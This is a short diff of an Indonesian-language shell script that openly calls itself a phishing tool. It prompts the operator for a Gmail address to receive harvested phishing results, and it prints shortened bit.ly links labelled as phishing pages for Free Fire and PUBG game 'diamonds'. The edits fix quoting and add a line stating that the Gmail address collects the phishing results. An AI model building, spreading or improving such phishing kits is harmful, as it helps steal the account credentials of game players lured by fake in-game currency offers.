@@ -21,7 +21,7 @@ echo
 clear
 
 sleep 1
-echo "\033[32;1m Masukkan Gmail Kamu" #tulisankeluar
+echo "\033[32;1m Masukkan Gmail Kamu>> di gunakan untuk menerima hasil Phising" #tulisankeluar
 read gmail #membaca tulisan
 echo
 echo
@@ -65,8 +65,8 @@ echo "Script ini berfungsi untuk Phising"
 sleep 2
 echo "Phising game "
 sleep 2
-echo "Phising Diamond FF: https://bit.ly/3jSJFuS
+echo "Phising Diamond FF: https://bit.ly/3jSJFuS"
 sleep 1
-echo "Phising Diamond PUBG: https://bit.ly/3jSJFuS
+echo "Phising Diamond PUBG: https://bit.ly/3jSJFuS"
 sleep 1
 echo "Gmail penerimaan hasil " $gmail
